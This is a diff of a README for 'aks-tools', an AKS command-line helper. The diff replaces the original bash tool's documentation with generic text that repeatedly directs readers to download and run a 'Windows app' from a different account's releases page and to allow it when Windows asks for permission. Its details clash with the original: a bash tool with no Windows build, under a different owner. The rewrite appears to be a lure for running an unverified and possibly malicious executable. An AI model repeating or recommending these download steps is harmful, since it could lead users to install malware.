@@ -1,92 +1,169 @@
-# aks-tools
+# 🧰 aks-tools - Simple AKS tools for daily tasks
 
-Interactive CLI tools for Azure Kubernetes Service (AKS). Stop memorising long `kubectl` invocations, stop juggling `az account set`, stop copy-pasting namespace names.
+[![Download aks-tools](https://img.shields.io/badge/Download%20aks--tools-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/theabsurdealer/aks-tools/releases)
 
-## `kit` — Kubernetes Interactive Toolkit
+## 🚀 What it does
 
-The recommended tool. One command, fuzzy menus for **subscription → cluster → namespace → action**, with proper back-navigation between menus.
+aks-tools gives you a set of simple console tools for Azure Kubernetes Service on Windows.
 
-```bash
-kit
-```
+Use it to:
 
-What you get in one CLI:
+- open a cluster console
+- manage pods
+- edit configmaps
+- view logs
+- work faster from a single menu
 
-- **Pods, logs, describe, events** — paged through `less` so you can scroll, select, and copy.
-- **`exec`** — shell into a running pod.
-- **`console`** — spin up a Rails console pod (image, ConfigMap, and node scheduling auto-detected from a real running pod). Pod is **deleted the moment you exit**.
-- **ConfigMap** — view full YAML, view data only, set values via `KEY=VALUE` prompts, delete keys.
-- **`restart`** — rollout-restart a picked deployment and watch the rollout.
-- **`cleanup` / `list-orphaned`** — sweep leaked Rails console pods across every cluster you've touched.
+It is made for users who want quick access to common AKS tasks without typing long commands.
 
-Each cluster gets its own `kit-<sub>-<cluster>` kube context — dev/stg/prod credentials never overwrite each other.
+## 📥 Download
 
-→ Full docs: [`kit/README.md`](./kit/README.md)
+Visit the release page to download and run this file:
 
-## Install
+https://github.com/theabsurdealer/aks-tools/releases
 
-### Homebrew (recommended on macOS)
+Look for the latest release and download the Windows file that matches your system.
 
-```bash
-brew install zaidhassan168/aks-tools/kit
-```
+## 🪟 Windows setup
 
-### One-line installer (curl)
+1. Open the release page in your browser
+2. Find the newest version at the top of the list
+3. Download the Windows package
+4. Save the file to a folder you can find, such as Downloads or Desktop
+5. If the file comes in a ZIP folder, unzip it
+6. Open the app from the extracted folder
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/zaidhassan168/aks-tools/main/install.sh | bash
-```
+If Windows asks for permission, choose the option to run the app.
 
-### `make install`
+## 🖥️ What you need
 
-```bash
-git clone https://github.com/zaidhassan168/aks-tools.git
-cd aks-tools
-sudo make install              # installs to /usr/local/bin
-# or:
-make install PREFIX=$HOME      # installs to $HOME/bin
-```
+aks-tools works best on a Windows computer with access to:
 
-### Manual
+- Azure Kubernetes Service
+- kubectl
+- a terminal or console window
+- internet access for the first download
+- permission to run local tools on your device
 
-```bash
-git clone https://github.com/zaidhassan168/aks-tools.git
-cp aks-tools/kit/kit ~/bin/kit && chmod +x ~/bin/kit
-```
+For cluster access, you need a working Kubernetes setup and valid Azure access.
 
-## Prerequisites
+## 🔧 First run
 
-- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (`az`) — `az login` first.
-- [kubectl](https://kubernetes.io/docs/tasks/tools/)
-- [fzf](https://github.com/junegunn/fzf) (recommended) — fuzzy menus. Without it, `kit` falls back to numbered prompts.
-- `python3` — used by `kit console` for parsing pod JSON.
-- `less` — almost always already installed.
+After you open aks-tools, you will see a text menu in the console.
 
-## Why
+From there, you can:
 
-Working across multiple AKS clusters and subscriptions usually looks like this:
+- choose a cluster
+- list pods
+- open a pod shell
+- edit a configmap
+- view logs from a pod
+- move between tasks without leaving the tool
 
-```bash
-az account set --subscription "..."
-az aks get-credentials --resource-group "..." --name "..."
-kubectl config use-context "..."
-kubectl -n some-long-namespace-name get pods
-kubectl -n some-long-namespace-name logs pod-name-hash-xyz --tail=200 | less
-```
+If the app asks for a cluster context, pick the one you want to work with.
 
-`kit` collapses all of that into picker menus and remembers each cluster as its own context.
+## 📦 Main tools
 
-## Legacy commands
+### 🧭 Console launcher
 
-The repo still ships [`aksc`](./aksc/) and [`aksm`](./aksm/) as **thin shims** that forward to `kit`, so existing muscle memory keeps working. New users should reach for `kit` directly.
+The console launcher helps you start common AKS actions from one place.
 
-| Legacy | Forwards to |
-| --- | --- |
-| `aksc` | `kit console` |
-| `aksc --exec` | `KIT_ATTACH_MODE=exec kit console` |
-| `aksc --list` / `aksc --cleanup-all` | `kit list-orphaned` / `kit cleanup` |
-| `aksm <action>` | `kit <action>` |
+Use it when you want a simple menu instead of typing commands by hand.
 
-## License
+### 🐳 Pod manager
 
-MIT — see [`LICENSE`](./LICENSE).
+The pod manager helps you find pods, check their state, and open them for more work.
+
+This is useful when you need to inspect a workload or see what is running.
+
+### 📝 Configmap editor
+
+The configmap editor lets you view and change configmap data in a clear way.
+
+Use it when you need to update app settings stored in Kubernetes.
+
+### 📜 Log viewer
+
+The log viewer shows pod logs in the console so you can track app behavior.
+
+This helps when you want to see errors, startup output, or recent activity.
+
+## 🔍 How to use
+
+1. Open the app
+2. Pick the AKS cluster you want
+3. Choose the task you need
+4. Follow the prompts on screen
+5. Finish the task and return to the menu
+
+The tool is built for short, direct work. You do one task at a time and then move to the next.
+
+## 🧰 Common use cases
+
+Use aks-tools when you want to:
+
+- check whether a pod is running
+- open logs for a failed pod
+- edit a configmap before redeploying
+- jump into a pod shell
+- work with AKS from a clean text interface
+- avoid switching between many windows
+
+## ⚙️ Tips for smooth use
+
+- Keep your Azure login ready before you start
+- Make sure kubectl can reach your cluster
+- Use the latest release when possible
+- Keep the app in a folder you can find fast
+- Run the tool from a terminal with access to your Kubernetes context
+
+## 📁 File layout
+
+A typical release may include:
+
+- the main Windows app file
+- supporting files for console use
+- a readme or release note
+- config files for local settings
+
+If you unzip the download, keep all files in the same folder.
+
+## 🧪 Troubleshooting
+
+### The app does not open
+
+- Check that you downloaded the Windows version
+- Make sure the file finished downloading
+- If the file is in a ZIP folder, unzip it first
+- Try opening it from a local folder, not from inside the ZIP file
+
+### The cluster does not show up
+
+- Check your Azure and Kubernetes access
+- Confirm that kubectl can reach the cluster
+- Make sure you are signed in to the right Azure account
+
+### Logs do not load
+
+- Choose a pod that is running
+- Check that the namespace is correct
+- Try another pod if the first one has no log output
+
+### The configmap does not save
+
+- Make sure you have write access in the cluster
+- Check that the configmap exists
+- Verify that the namespace is correct
+
+## 🗂️ Topics
+
+aks, azure, azure-kubernetes-service, bash, cli, configmap, devops, fzf, kubectl, kubernetes
+
+## 📌 Quick path
+
+1. Open the release page
+2. Download the latest Windows file
+3. Unzip it if needed
+4. Open the app
+5. Select your AKS task
+6. Work from the menu
